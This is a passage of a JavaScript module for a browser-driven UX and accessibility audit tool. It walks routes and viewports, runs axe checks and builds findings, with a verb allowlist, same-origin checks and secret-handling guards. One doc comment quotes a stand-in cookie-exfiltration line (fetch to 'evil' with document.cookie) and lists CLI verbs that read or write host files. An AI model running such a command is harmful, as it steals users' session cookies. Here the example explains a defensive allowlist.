/**
 * ux-grill/collect.mjs — Stufe 1: the LLM-free mechanical run (PRD § 2 S2).
 *
 * Walks `routes × viewports` (and then the journeys) of a loaded ux-manifest
 * with `agent-browser`, writes the raw artefacts (screenshots, axe JSON,
 * measures JSON) under `.orchestrator/metrics/ux-grill/<run-id>/`, and turns the
 * measured values into fingerprint-stable findings via `schema.mjs`.
 *
 * Three hard properties this module is built around:
 *
 * 1. **Determinism** (PRD § 3 AC "zweimal läuft"): nothing runtime-varying —
 *    no timestamp, no run id, no absolute path — ever reaches a finding. Artefact
 *    pointers are stored run-dir RELATIVE in `evidence`, and `findings.jsonl` is
 *    written sorted by fingerprint, so two runs against the same build diff empty.
 * 2. **No secret ever lands on disk** (PRD § 3 AC "nur die Env-NAMEN"): persona
 *    credentials exist only as local variables handed to an `execFile` argv array.
 *    Substituted journey step text is never written to an artefact, a finding, a
 *    message or stderr. Step skips use the command verb and a fixed diagnostic.
 * 3. **One seam to the browser**: every `agent-browser` invocation goes through
 *    the injected `exec`. `defaultExec` is the only place in this module that
 *    touches `node:child_process`, and it always uses an argv ARRAY — a manifest
 *    value must never reach a shell (SEC-006/SEC-007 at the process boundary).
 *
 * Exports: CollectError, DEVICE_WIDTHS, JOURNEY_STEP_OVERRUN, STEP_VERBS,
 *   defaultExec,
 *   sessionName, viewportLocator, journeyLocator, splitStepLine, assertStepArgv,
 *   readCommandPayload, readEvalPayload,
 *   findingsFromAxe, findingsFromTargets, findingFromOverflow, findingFromTitle,
 *   findingsFromErrors, journeyFindings, collect
 */

import fs from 'node:fs';
import path from 'node:path';

import { redactSpans } from '../redact-spans.mjs';
import {
  CHECK_IDS,
  SEVERITY_BY_CHECK,
  SKIP_REASONS,
  makeFinding,
  makeRunRecord,
  severityForAxeImpact,
} from './schema.mjs';
import {
  assertGuardedEnvsLoopback,
  assertLoopbackBaseUrl,
  resolvePersonaCredentials as defaultResolveCredentials,
} from './manifest.mjs';
import { hasHorizontalOverflow, parseEvalOutput, titleMatches } from './measures.mjs';
import {
  artefactStem,
  axeDir,
  findingsPath,
  makeRunId,
  measuresDir,
  runDirPath,
  screenshotName,
  screenshotsDir,
} from './paths.mjs';
import { appendRunRecord } from './run-record.mjs';
import { execFile } from '../native-command.mjs';

/** Binary driven by this module. Resolved via PATH — the global install is `/opt/homebrew/bin/agent-browser`. */
const AGENT_BROWSER = 'agent-browser';

/** `execFile` stdout/stderr cap. A full-page axe JSON on a large route runs to a few MB. */
const EXEC_MAX_BUFFER = 16 * 1024 * 1024;

/** Per-command wall-clock cap. `agent-browser`'s own waits default to 25 s, so this only catches a wedged daemon. */
const EXEC_TIMEOUT_MS = 120_000;

// Re-read the document so a transition started by a finishing animation is
// included too. Decorative loops and paused animations need no settling time.
// NAMED CEILING (BV-004, #2190 item 9): a long but FINITE animation still running
// at the 2-s cap fails this precheck, and the caller then skips the WHOLE axe run
// (`measure-failed` on `a11y`), though only `color-contrast` reads mixed colours.
// Narrowing needs `agent-browser a11y` to disable or select single rules (it takes
// `--tags`/`--selector` only, measured 2026-11-23 via `a11y --help`), or a post-hoc
// filter that adds a second skip kind to the run record. REVISIT TRIGGER: a route
// whose animation outlasts the cap loses every non-contrast axe finding in a report,
// or `a11y` gains rule selection.
const AXE_SETTLED_EVAL = `(async () => {
  const deadline = performance.now() + 2000;
  while (document.getAnimations().some(animation =>
    animation.playState === 'running' && Number.isFinite(animation.effect?.getComputedTiming().endTime)
  )) {
    if (performance.now() >= deadline) throw new Error('Timed out waiting for animations before axe');
    await new Promise(resolve => setTimeout(resolve, 32));
  }
  return null;
})()`;

/**
 * How many steps a journey may run PAST its `max-steps` before we stop.
 *
 * Deliberate ceiling (BV-004): a journey that overshoots its budget is still
 * interesting — `journey-step-count` needs the real step count, and success
 * reached at `max-steps + 2` is a different finding from success never reached.
 * Four is enough to separate "slightly over budget" from "lost"; revisit if a
 * manifest ever declares a journey whose legitimate overshoot exceeds it.
 * @type {number}
 */
export const JOURNEY_STEP_OVERRUN = 4;

/**
 * The `agent-browser` verbs a journey step may use — an ALLOWLIST, because a
 * manifest is a sixth command-bearing surface beyond the five in
 * `.claude/rules/security.md` § Session Config Command Trust, and this one is
 * invisible to `hooks/pre-bash-destructive-guard.mjs`: `defaultExec` spawns via
 * `execFile` with `shell: false`, so no step argv ever reaches Bash.
 *
 * What the denied half of the CLI surface can do, all measured as ACCEPTED
 * before this allowlist existed (2026-09-12): `upload <sel> <any host path>`
 * and `cookies set --curl <file>` READ arbitrary host files into the page,
 * `download <sel> <path>` and `pdf <path>` WRITE arbitrary host paths,
 * `eval <js>` exfiltrates off-origin (`fetch('http://evil/?c='+document.cookie)`),
 * `connect <port>` retargets the run at a foreign browser, and `close --all`
 * kills every other agent's session on the machine.
 *
 * The list is the UI vocabulary a journey actually needs, each name verified
 * against `agent-browser --help` (v0.37.1, 2026-09-12). `screenshot` is
 * deliberately absent: `collect()` takes its own after each step.
 * @type {ReadonlySet<string>}
 */
export const STEP_VERBS = Object.freeze(new Set([
  'back',
  'check',
  'click',
  'dblclick',
  'drag',
  'fill',
  'find',
  'focus',
  'forward',
  'get',
  'hover',
  'is',
  'keyboard',
  'open',
  'press',
  'reload',
  'scroll',
  'scrollintoview',
  'select',
  'snapshot',
  'type',
  'uncheck',
  'wait',
]));

/**
 * Expected `window.innerWidth` per `agent-browser set device` name.
 *
 * MEASURED, never guessed (2026-09-12, agent-browser 0.37.1): each name was
 * applied to a page carrying `<meta name=viewport content="width=device-width,
 * initial-scale=1">` and `window.innerWidth` read back —
 * `iPhone 15` 393 · `iPhone 16` 393 · `iPhone 16 Pro` 402 · `iPhone 17` 402 ·
 * `iPad` 820 · `iPad Pro` 1024 · `Pixel 9` 412 · `Galaxy S25` 360. That is the
 * COMPLETE supported set the tool itself prints when handed an unknown name
 * ("Supported: iPhone 15, iPhone 16, iPhone 16 Pro, iPhone 17, iPad, iPad Pro,
 * Pixel 9, Galaxy S25", exit 1).
 *
 * Two measurement notes, both load-bearing: on a page WITHOUT a viewport meta
 * every one of these names measures 980 (the layout-viewport default), so a
 * width read from such a page proves nothing about the device; and an unknown
 * name leaves the PREVIOUS device in place, which is why an unlisted device
 * without an explicit `expected-width` is skipped rather than trusted
 * (PRD § 5 "set device kennt Gerätenamen nicht").
 * @type {Readonly<Record<string, number>>}
 */
export const DEVICE_WIDTHS = Object.freeze({
  'iPhone 15': 393,
  'iPhone 16': 393,
  'iPhone 16 Pro': 402,
  'iPhone 17': 402,
  iPad: 820,
  'iPad Pro': 1024,
  'Pixel 9': 412,
  'Galaxy S25': 360,
});

/** Characters `makeFinding` rejects inside a locator. */
const LOCATOR_UNSAFE = /[\n\r\0]/g;

/** Populated by {@link loadMeasures}; lets the pure helpers classify without an async hop. */
let classifyTargetSizeRef = null;
let measuresModule = null;

/**
 * Programmer / precondition error. Browser failures are NOT thrown — they are
 * recorded as `skipped` entries in the run-record (PRD § 4 `skipped[]`), because
 * a route that never loaded must not read as "clean" in the next compare run.
 */
export class CollectError extends Error {
  /**
   * @param {string} code - machine-readable cause, e.g. `'base-url-unreachable'`
   * @param {string} message - one-line human summary; never carries a secret value
   */
  constructor(code, message) {
    super(message);
    this.name = 'CollectError';
    this.code = code;
  }
}

/** Keep process failures distinct from CLI diagnostics, which may describe UX failures. */
function processFailureKind(error) {
  if (error?.signal) return 'signal';
  if (error?.killed || ['ABORT_ERR', 'ETIMEDOUT', 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER'].includes(error?.code)) {
    return 'aborted';
  }
  const spawnSyscall = typeof error?.syscall === 'string' && error.syscall.startsWith('spawn ');
  if (spawnSyscall || ['ENOENT', 'EACCES'].includes(error?.code)) return 'spawn';
  return undefined;
}

const PROCESS_FAILURE_MESSAGES = Object.freeze({
  spawn: 'agent-browser could not start',
  signal: 'agent-browser was terminated by a signal',
  aborted: 'agent-browser execution was aborted',
});

/**
 * Spawn `agent-browser` with an argv ARRAY (never a shell string) and resolve —
 * not reject — on a non-zero exit, so the caller can record a skip.
 *
 * @param {string[]} args - argv passed verbatim to `agent-browser`
 * @param {{timeout?: number, cwd?: string}} [opts]
 * @returns {Promise<{stdout: string, stderr: string, code: number, processFailure?: 'spawn'|'signal'|'aborted'}>}
 */
export function defaultExec(args, opts = {}) {
  return new Promise((resolve) => {
    execFile(
      AGENT_BROWSER,
      args,
      { maxBuffer: EXEC_MAX_BUFFER, timeout: opts.timeout ?? EXEC_TIMEOUT_MS, cwd: opts.cwd },
      (error, stdout, stderr) => {
        const processFailure = processFailureKind(error);
        resolve({
          stdout: String(stdout ?? ''),
          stderr: String(stderr ?? ''),
          // Keep the numeric status contract for other commands.
          code: error ? (typeof error.code === 'number' ? error.code : 1) : 0,
          ...(processFailure ? { processFailure } : {}),
        });
      },
    );
  });
}

/**
 * Deterministic fallback `agent-browser` session name.
 *
 * Used only when `session id --scope worktree --prefix uxgrill` is unavailable
 * (the daemon is the SSOT when it answers). Never the default (unnamed) session:
 * that one is shared with every other agent on the machine and would contaminate
 * the captures (PRD § 5 "Zwei Sessions teilen den agent-browser-Default-Daemon").
 *
 * @param {string} repoRoot - absolute repo root; its basename disambiguates hosts
 * @param {string} [runId] - appended when given, making the name unique per run
 * @returns {string} e.g. `'uxgrill-session-orchestrator-1757635200123-9f3a01'`
 */
export function sessionName(repoRoot, runId) {
  const slug = String(path.basename(repoRoot || 'repo'))
    .replace(/[^A-Za-z0-9._-]/g, '-')
    .replace(/-+/g, '-')
    .slice(0, 40);
  return runId ? `uxgrill-${slug}-${runId}` : `uxgrill-${slug}`;
}

/** Strip the characters `makeFinding` forbids, so a hostile selector cannot throw mid-run. */
function safeLocatorPart(value) {
  return String(value ?? '').replace(LOCATOR_UNSAFE, ' ');
}

/**
 * Route-check locator: `route|viewport|selector` (PRD § 2 S2).
 * @param {string} route
 * @param {string} viewportName
 * @param {string} selector
 * @returns {string}
 */
export function viewportLocator(route, viewportName, selector) {
  return `${safeLocatorPart(route)}|${safeLocatorPart(viewportName)}|${safeLocatorPart(selector)}`;
}

/**
 * Journey-check locator: `journey|viewport|<name>` (PRD § 2 S2).
 * @param {string} viewportName
 * @param {string} name - journey name
 * @returns {string}
 */
export function journeyLocator(viewportName, name) {
  return `journey|${safeLocatorPart(viewportName)}|${safeLocatorPart(name)}`;
}

/**
 * Quote-aware splitter for a manifest journey step line into an argv array.
 *
 * Named ceiling (BV-004): handles single quotes, double quotes and backslash
 * escapes ONLY. No variable expansion, no globbing, no `|`/`&&`/`;` operators,
 * no here-docs — a step line is an `agent-browser` invocation, not a shell
 * program, and the argv never reaches a shell. Revisit only if a manifest needs
 * a genuine shell construct, which would be a scope decision, not a parser bug.
 *
 * The leading `agent-browser` word is dropped when present, so both
 * `agent-browser click @e3` and `click @e3` are accepted.
 *
 * This function is a pure SPLITTER — the verb allowlist and the same-origin
 * check on `open` live in {@link assertStepArgv}, which every caller runs on
 * the result. Keeping them apart means the splitter stays testable without a
 * `base-url` and the guard has exactly one implementation.
 *
 * A step carrying its own `--session` is REFUSED (`step-session-override`): the
 * run's session is this module's isolation boundary — the captures, the error
 * buffer and the `close` in the `finally` all hang off it — and a step that
 * retargets it would drive (and then leave behind) somebody else's browser.
 * `collect()` appends its own `--session`; substituted tokens are checked again
 * by prepareStepArgv rather than relying on the CLI's option precedence.
 *
 * @param {string} line
 * @returns {string[]} argv tokens (possibly empty for a blank/comment line)
 * @throws {CollectError} code `step-session-override`
 */
export function splitStepLine(line) {
  const out = [];
  let current = '';
  let started = false;
  let quote = null;
  const text = String(line ?? '');
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i];
    if (quote) {
      if (ch === quote) quote = null;
      else if (ch === '\\' && quote === '"' && i + 1 < text.length) {
        i += 1;
        current += text[i];
      } else current += ch;
      continue;
    }
    const whitespace = /\s/.test(ch);
    if (ch === '"' || ch === "'") {
      quote = ch;
      started = true;
      continue;
    }
    if (ch === '\\' && i + 1 < text.length) {
      i += 1;
      current += text[i];
      started = true;
      continue;
    }
    if (whitespace) {
      if (started) out.push(current);
      current = '';
      started = false;
      continue;
    }
    current += ch;
    started = true;
  }
  if (started) out.push(current);
  if (out[0] === AGENT_BROWSER) out.shift();
  if (out.some((token) => token === '--session' || token.startsWith('--session='))) {
    throw new CollectError('step-session-override', 'journey step carries --session — steps run in the session collect() owns');
  }
  return out;
}

/**
 * Assert a split or credential-substituted step argv is inside the allowed vocabulary.
 *
 * Two rules, both DENY-shaped:
 *
 * 1. `argv[0]` must be in {@link STEP_VERBS}. The refused verb IS named in the
 *    message. prepareStepArgv validates it before substitution, so only a literal
 *    allowlisted verb reaches its second check; the rest of argv is never named.
 * 2. An `open` step must resolve to `baseUrl`'s origin, the same predicate
 *    `routes[].path` and `journeys[].start` already pass. Without it, `open`
 *    was the one allowlisted verb that could still walk the run — and its
 *    substituted credentials — onto a foreign page.
 *
 * `baseUrl` is REQUIRED: a guard whose predicate is optional is not a guard.
 *
 * @param {string[]} argv - split tokens, or substituted tokens with a prevalidated literal verb
 * @param {{baseUrl: string}} opts
 * @returns {string[]} the same argv, so callers can chain
 * @throws {CollectError} `step-verb-not-allowed`, `step-open-off-origin`
 * @throws {TypeError} when `baseUrl` is absent
 */
export function assertStepArgv(argv, { baseUrl } = {}) {
  if (typeof baseUrl !== 'string' || baseUrl.length === 0) {
    throw new TypeError('assertStepArgv: baseUrl must be a non-empty string');
  }
  const tokens = Array.isArray(argv) ? argv : [];
  if (tokens.length === 0) return tokens;
  const verb = tokens[0];
  if (!STEP_VERBS.has(verb)) {
    throw new CollectError(
      'step-verb-not-allowed',
      'journey step verb is not in the allowed UI vocabulary',
    );
  }
  if (verb === 'open') {
    const location = tokens.slice(1).find((token) => !token.startsWith('-'));
    if (location === undefined) {
      throw new CollectError('step-open-off-origin', 'journey step `open` needs a same-origin location');
    }
    // Throws with the URL absent from the message — see resolveWithinOrigin.
    resolveWithinOrigin(baseUrl, location, { code: 'step-open-off-origin', subject: 'journey step `open`' });
  }
  return tokens;
}

/**
 * Read the payload of an `agent-browser <cmd> --json` result.
 *
 * MEASURED envelope (2026-09-12, v0.37.1) — the reason this is not a bare
 * `JSON.parse`, and the reason a failure cannot be read off the exit code alone:
 *
 * ```
 * $ agent-browser get title --json   → {"success":true,"data":{…,"title":"Hello"},"error":null}
 * $ agent-browser errors --json      → {"success":true,"data":{"errors":[],…},"error":null}
 * $ agent-browser eval "throw 1" --json
 *                                    → {"success":false,"data":null,"error":"…"}   EXIT CODE 0
 * ```
 *
 * So `success: false` at exit 0 is a real failure mode, and a caller that only
 * checked `code !== 0` would record "0 findings" for a check that never ran.
 * Every failure shape collapses into `{ok: false}` here and the caller turns
 * that into a `measure-failed` skip.
 *
 * @param {{stdout?: string, code?: number}} result - as returned by `exec`
 * @returns {{ok: true, value: unknown}|{ok: false}}
 */
export function readCommandPayload(result) {
  if (!result || result.code !== 0) return { ok: false };
  const parsed = parseEvalOutput(result.stdout);
  if (!parsed.ok) return { ok: false };
  const value = parsed.value;
  if (value && typeof value === 'object' && !Array.isArray(value) && 'success' in value) {
    if (value.success !== true) return { ok: false };
    return { ok: true, value: value.data ?? null };
  }
  return { ok: true, value };
}

/**
 * Read the completion value of an `agent-browser eval … --json` result: the
 * same envelope as {@link readCommandPayload}, plus the `data.result` hop the
 * eval command adds.
 *
 * @param {{stdout?: string, code?: number}} result
 * @returns {{ok: true, value: unknown}|{ok: false}}
 */
export function readEvalPayload(result) {
  const payload = readCommandPayload(result);
  if (!payload.ok) return { ok: false };
  const value = payload.value;
  if (value && typeof value === 'object' && !Array.isArray(value) && 'result' in value) {
    return { ok: true, value: value.result };
  }
  return { ok: true, value };
}

/** Flatten an axe `target` (nested arrays preserve shadow-DOM boundaries) into one selector string. */
function flattenTarget(target) {
  if (Array.isArray(target)) return target.map((part) => flattenTarget(part)).filter(Boolean).join(' >>> ');
  return String(target ?? '').trim();
}

/**
 * One finding per axe violation × node target (PRD § 3 AC: two axe rules on one
 * selector stay two findings, which holds because the rule id is in the checkId
 * and therefore in the fingerprint).
 *
 * @param {object|Array} axeJson - parsed `a11y --json` payload, or its `violations` array
 * @param {{route: string, viewport: string, build: string, evidence?: object}} ctx
 * @returns {object[]} findings
 */
export function findingsFromAxe(axeJson, { route, viewport, build, evidence } = {}) {
  const payload = axeJson && typeof axeJson === 'object' ? axeJson : {};
  const violations = Array.isArray(payload) ? payload : (payload.violations ?? []);
  const findings = [];
  for (const violation of Array.isArray(violations) ? violations : []) {
    const ruleId = String(violation?.id ?? '').trim();
    if (ruleId.length === 0) continue;
    const severity = severityForAxeImpact(violation?.impact);
    const nodes = Array.isArray(violation?.nodes) && violation.nodes.length > 0 ? violation.nodes : [{ target: [':root'] }];
    for (const node of nodes) {
      const selector = flattenTarget(node?.target) || ':root';
      findings.push(
        makeFinding({
          checkId: `axe-${ruleId}`,
          locator: viewportLocator(route, viewport, selector),
          severity,
          build,
          message: String(violation?.help ?? `axe rule ${ruleId} violated`),
          evidence: { ...(evidence ?? {}), impact: violation?.impact ?? null, helpUrl: violation?.helpUrl ?? null },
        }),
      );
    }
  }
  return findings;
}

function targetBoxes(payload) {
  const boxes = Array.isArray(payload) ? payload : payload?.targets;
  return Array.isArray(boxes) ? boxes : null;
}

/** Older measurements have no exemption flags and contribute zero. */
function countTargetExemptions(counts, boxes) {
  for (const box of boxes) {
    if (box?.exempt === undefined) continue;
    for (const key of ['inline', 'hit_area']) {
      const flag = box.exempt?.[key];
      if (flag === true) counts[key]++;
      else if (flag !== false) counts.partial = true;
    }
  }
}

/**
 * Target-size findings from the `measures.mjs` TARGET_SIZE_EVAL payload.
 *
 * The eval answers a plain OBJECT `{targets, scanned, truncated}` (measured
 * against the real browser 2026-09-12). Each undersized box can carry exemption
 * flags. A bare ARRAY is accepted too, so a caller that already
 * projected `.targets` keeps working. `truncated: true` means the scan hit its
 * cap, which is stamped onto every finding of that page: a truncated scan is a
 * population statement, and a finding derived from one must say so.
 *
 * @param {{targets: Array, scanned?: number, truncated?: boolean}|Array<{selector: string, width: number, height: number}>} targets
 * @param {{route: string, viewport: string, build: string, evidence?: object,
 *   classify?: (box: {width: number, height: number}) => ('floor'|'target'|null)}} ctx
 *   `classify` defaults to `measures.mjs` `classifyTargetSize` once `collect()`
 *   has loaded it — the thresholds live there and are NOT duplicated here.
 * @returns {object[]} findings
 * @throws {CollectError} code `measures-unavailable` when no classifier is reachable
 */
export function findingsFromTargets(targets, { route, viewport, build, evidence, classify } = {}) {
  const classifier = classify ?? classifyTargetSizeRef;
  if (typeof classifier !== 'function') {
    throw new CollectError(
      'measures-unavailable',
      'findingsFromTargets: pass `classify` (measures.mjs classifyTargetSize) — thresholds are not duplicated here',
    );
  }
  const bareBoxes = Array.isArray(targets);
  const list = targetBoxes(targets) ?? [];
  const truncated = !bareBoxes && targets?.truncated === true;
  const findings = [];
  for (const box of list) {
    if (box?.exempt?.inline === true) continue;
    const hitArea = box?.exempt?.hit_area === true;
    if (hitArea && box.verdict !== 'target') continue;
    const width = Number(box?.width);
    const height = Number(box?.height);
    if (!Number.isFinite(width) || !Number.isFinite(height)) continue;
    // The eval classifies raw dimensions and rounds only the reported size.
    const band = (hitArea || !bareBoxes) && box.verdict !== undefined ? box.verdict : classifier({ width, height });
    if (band !== 'floor' && band !== 'target') continue;
    const checkId = band === 'floor' ? CHECK_IDS.TARGET_SIZE_FLOOR : CHECK_IDS.TARGET_SIZE_TARGET;
    findings.push(
      makeFinding({
        checkId,
        locator: viewportLocator(route, viewport, box?.selector ?? ''),
        severity: SEVERITY_BY_CHECK[checkId],
        build,
        message: `interactive target measures ${width}×${height} CSS px`,
        evidence: { ...(evidence ?? {}), width, height, ...(truncated ? { truncated: true } : {}) },
      }),
    );
  }
  return findings;
}

/**
 * Horizontal-overflow finding, or `null` when the page fits. Locator selector
 * is the literal `document` — the overflow is a property of the page, not of an
 * element.
 *
 * The verdict is `measures.mjs` `hasHorizontalOverflow()`, which applies the
 * `OVERFLOW_TOLERANCE_PX` (1 px) subpixel tolerance. This module used to
 * re-implement a STRICTER comparison (`scrollWidth <= innerWidth` → clean), so
 * a 1439.5 px container in a 1440 px viewport produced a finding here and none
 * in the helper the rubric cites. One predicate, in the module that owns it.
 *
 * @param {{scrollWidth: number, innerWidth: number}} overflow - OVERFLOW_EVAL payload
 * @param {{route: string, viewport: string, build: string, evidence?: object}} ctx
 * @returns {object|null}
 */
export function findingFromOverflow(overflow, { route, viewport, build, evidence } = {}) {
  const scrollWidth = Number(overflow?.scrollWidth);
  const innerWidth = Number(overflow?.innerWidth);
  if (!hasHorizontalOverflow({ scrollWidth, innerWidth })) return null;
  return makeFinding({
    checkId: CHECK_IDS.HORIZONTAL_OVERFLOW,
    locator: viewportLocator(route, viewport, 'document'),
    severity: SEVERITY_BY_CHECK[CHECK_IDS.HORIZONTAL_OVERFLOW],
    build,
    message: `page scrolls horizontally: scrollWidth ${scrollWidth} > innerWidth ${innerWidth}`,
    evidence: { ...(evidence ?? {}), scrollWidth, innerWidth },
  });
}

/**
 * Title-mismatch finding, or `null` when the title matches `title-pattern`
 * (or when the route declares no pattern — an absent expectation is not a defect).
 *
 * @param {string} title - measured `document.title`
 * @param {string|undefined} pattern - route `title-pattern` (a regular expression)
 * @param {{route: string, viewport: string, build: string, evidence?: object}} ctx
 * @returns {object|null}
 * @throws {CollectError} code `invalid-title-pattern` — a manifest defect. It can
 *   only be reached by a caller that skipped {@link assertTitlePatternsCompile};
 *   `collect()` validates every route pattern BEFORE it opens a browser, so a
 *   broken manifest never starts a run half-way.
 */
export function findingFromTitle(title, pattern, { route, viewport, build, evidence } = {}) {
  const verdict = titleMatches(String(title ?? ''), pattern);
  if (!verdict.ok) {
    throw new CollectError('invalid-title-pattern', `route ${route}: title-pattern is not a valid regular expression`);
  }
  if (verdict.matched) return null;
  const measured = String(title ?? '');
  return makeFinding({
    checkId: CHECK_IDS.TITLE_MISMATCH,
    locator: viewportLocator(route, viewport, 'title'),
    severity: SEVERITY_BY_CHECK[CHECK_IDS.TITLE_MISMATCH],
    build,
    message: `page title does not match title-pattern ${String(pattern)}`,
    evidence: { ...(evidence ?? {}), title: measured },
  });
}

/** Normalise the `errors --json` payload (array, `{errors: []}`, or `{count: n}`) into an array. */
function normalizeErrors(payload) {
  if (Array.isArray(payload)) return payload;
  if (payload && typeof payload === 'object') {
    if (Array.isArray(payload.errors)) return payload.errors;
    if (Array.isArray(payload.messages)) return payload.messages;
    if (Number.isFinite(Number(payload.count))) return new Array(Number(payload.count)).fill({});
  }
  return [];
}

/**
 * ONE `console-errors` finding per route × viewport when at least one page error
 * was recorded (PRD § 2 S3: the check is "≥ 1 Fehler auf der Route", not one
 * finding per error — otherwise a single broken script inflates the ledger).
 *
 * @param {*} errors - parsed `errors --json` payload
 * @param {{route: string, viewport: string, build: string, evidence?: object}} ctx
 * @returns {object[]} zero or one finding
 */
export function findingsFromErrors(errors, { route, viewport, build, evidence } = {}) {
  const list = normalizeErrors(errors);
  if (list.length === 0) return [];
  return [
    makeFinding({
      checkId: CHECK_IDS.CONSOLE_ERRORS,
      locator: viewportLocator(route, viewport, 'console'),
      severity: SEVERITY_BY_CHECK[CHECK_IDS.CONSOLE_ERRORS],
      build,
      message: `${list.length} page error(s) recorded on this route`,
      evidence: { ...(evidence ?? {}), errorCount: list.length },
    }),
  ];
}

/**
 * Journey findings (PRD § 3 AC): `journey-failed` when `success` was never
 * reached, with a diagnostic when a step reply was ambiguous. A successful
 * journey exceeding `max-steps` produces `journey-step-count`.
 *
 * @param {{name: string, viewport: string, stepsRun: number, maxSteps: number,
 *   success: boolean, stepFailed?: boolean, build: string, evidence?: object}} ctx
 * @returns {object[]}
 */
export function journeyFindings({ name, viewport, stepsRun, maxSteps, success, stepFailed, build, evidence } = {}) {
  const locator = journeyLocator(viewport, name);
  const steps = Number(stepsRun) || 0;
  const budget = Number(maxSteps);
  if (!success) {
    const diagnostic = stepFailed ? ' (ambiguous agent-browser step reply)' : '';
    return [
      makeFinding({
        checkId: CHECK_IDS.JOURNEY_FAILED,
        locator,
        severity: SEVERITY_BY_CHECK[CHECK_IDS.JOURNEY_FAILED],
        build,
        message: `journey did not reach its success condition after ${steps} step(s)${diagnostic}`,
        evidence: { ...(evidence ?? {}), stepsRun: steps, maxSteps: budget },
      }),
    ];
  }
  if (Number.isFinite(budget) && steps > budget) {
    return [
      makeFinding({
        checkId: CHECK_IDS.JOURNEY_STEP_COUNT,
        locator,
        severity: SEVERITY_BY_CHECK[CHECK_IDS.JOURNEY_STEP_COUNT],
        build,
        message: `journey reached success in ${steps} step(s), budget is ${budget}`,
        evidence: { ...(evidence ?? {}), stepsRun: steps, maxSteps: budget },
      }),
    ];
  }
  return [];
}

/** Lazily load `measures.mjs` (sibling module, written in the same wave) and cache its classifier. */
async function loadMeasures(injected) {
  if (injected) {
    measuresModule = injected;
    classifyTargetSizeRef = injected.classifyTargetSize ?? classifyTargetSizeRef;
    return injected;
  }
  if (measuresModule) return measuresModule;
  measuresModule = await import('./measures.mjs');
  classifyTargetSizeRef = measuresModule.classifyTargetSize ?? null;
  return measuresModule;
}

/**
 * Re-assert the loopback guards at the Stufe-1 entry point.
 *
 * `manifest.mjs` guards these at parse time; collect.mjs asserts them again
 * because the AC names THIS module as the thing that must refuse to drive a
 * browser against production, and a guard that depends on its caller having run
 * another guard is not a guard (BV-002). No env VALUE is ever put in the message.
 *
 * Defence in depth means running the guard twice — never OWNING a second
 * predicate: the two copies had already drifted (this one accepted `0.0.0.0`
 * and `*.localhost`, `manifest.mjs` did not), so the predicates below are
 * `manifest.mjs`'s, re-thrown as {@link CollectError} for this module's callers.
 *
 * @param {object} frontmatter
 * @param {Map<string,string>} envMap
 */
function assertLoopback(frontmatter, envMap) {
  try {
    assertLoopbackBaseUrl(frontmatter);
    assertGuardedEnvsLoopback(frontmatter, envMap);
  } catch (error) {
    if (error?.name === 'ManifestError') throw new CollectError(error.code, error.message);
    throw error;
  }
}

/**
 * Resolve a manifest-supplied location against `base-url` and REQUIRE the same
 * origin.
 *
 * "Is it loopback?" is not enough: `http://127.0.0.1:9999` is loopback and is
 * still a different application — and an absolute `start:` on an attacker host
 * plus a `fill #pw ${LOGIN_PASSWORD}` step would type the live credential into
 * that page. Origin equality is the only predicate that keeps the run inside
 * the app the manifest declares.
 *
 * The message never carries the resolved URL: it may hold a query string or
 * embedded credentials, and this module's contract is that nothing secret
 * reaches a message, a log line or an artefact.
 *
 * @param {string} baseUrl - already normalised (no trailing slash)
 * @param {unknown} value - a route `path` or a journey `start`
 * @param {{code: string, subject: string}} ctx - `subject` names the manifest
 *   entry (route path or `journey <name>`), never the URL
 * @returns {string} the absolute, same-origin URL to open
 * @throws {CollectError} with `ctx.code`
 */
function resolveWithinOrigin(baseUrl, value, { code, subject }) {
  const base = new URL(baseUrl);
  let resolved;
  try {
    resolved = new URL(String(value ?? ''), base);
  } catch {
    throw new CollectError(code, `${subject} is not a resolvable location`);
  }
  if (resolved.origin !== base.origin) {
    throw new CollectError(code, `${subject} resolves outside the base-url origin — refusing to drive a foreign app`);
  }
  return resolved.toString();
}

/** Parse a `WxH` viewport string into `[width, height]`, or `null` when malformed. */
function parseViewport(value) {
  const match = /^\s*(\d+)\s*[xX×]\s*(\d+)\s*$/.exec(String(value ?? ''));
  return match ? [Number(match[1]), Number(match[2])] : null;
}

/** Keep the display text alongside the recorded measurement scope. */
function skipEntry(what, reason, scope) {
  return { what, reason, scope };
}

/** One report row per label. The ledger still records each affected scope. */
function summarizeSkips(skipped) {
  const byWhat = new Map();
  for (const { what, reason } of skipped) {
    if (!byWhat.has(what)) byWhat.set(what, { what, reasons: [], count: 0 });
    const row = byWhat.get(what);
    row.count += 1;
    if (!row.reasons.includes(reason)) row.reasons.push(reason);
  }
  return [...byWhat.values()];
}

/**
 * Run Stufe 1 end to end.
 *
 * @param {object} opts
 * @param {string} opts.repoRoot - absolute repo root of the TARGET repo
 * @param {{frontmatter: object, manifestHash: string}} opts.manifest - as returned by `manifest.mjs` `loadManifest()`
 * @param {Map<string,string>} [opts.envMap] - resolved env-file map from `loadManifest()`
 *   (VALUES; never written anywhere). MUST be a `Map` — the same type `manifest.mjs` uses.
 * @param {string} opts.rubricHash - hash of `skills/ux-grill/rubric-v2.md`
 * @param {typeof defaultExec} [opts.exec]
 * @param {string} [opts.runId]
 * @param {() => Date} [opts.now] - clock seam for the run-record timestamp
 * @param {object} [opts.measures] - injected `measures.mjs` namespace (tests); defaults to the real module
 * @param {(persona: object, envMap: Map<string,string>) => {email: string, password: string}} [opts.resolveCredentials]
 *   defaults to `manifest.mjs` `resolvePersonaCredentials`, loaded lazily
 * @returns {Promise<{runId: string, runDir: string, findings: object[], runRecord: object,
 *   skipped: object[], skipSummary: Array<{what: string, reasons: string[], count: number}>}>}
 * @throws {CollectError} on a precondition failure, or when the first login or
 *   route open fails (`base-url-unreachable` — the app is not running)
 */
export async function collect({
  repoRoot,
  manifest,
  envMap = new Map(),
  rubricHash,
  exec = defaultExec,
  runId = makeRunId(),
  now = () => new Date(),
  measures = null,
  resolveCredentials = null,
} = {}) {
  if (typeof repoRoot !== 'string' || repoRoot.length === 0) {
    throw new CollectError('invalid-args', 'collect: repoRoot must be a non-empty string');
  }
  if (typeof rubricHash !== 'string' || rubricHash.length === 0) {
    throw new CollectError('invalid-args', 'collect: rubricHash must be a non-empty string');
  }
  const frontmatter = manifest?.frontmatter;
  const manifestHash = manifest?.manifestHash;
  if (!frontmatter || typeof frontmatter !== 'object' || typeof manifestHash !== 'string' || manifestHash.length === 0) {
    throw new CollectError('invalid-manifest', 'collect: manifest must carry {frontmatter, manifestHash} from loadManifest()');
  }
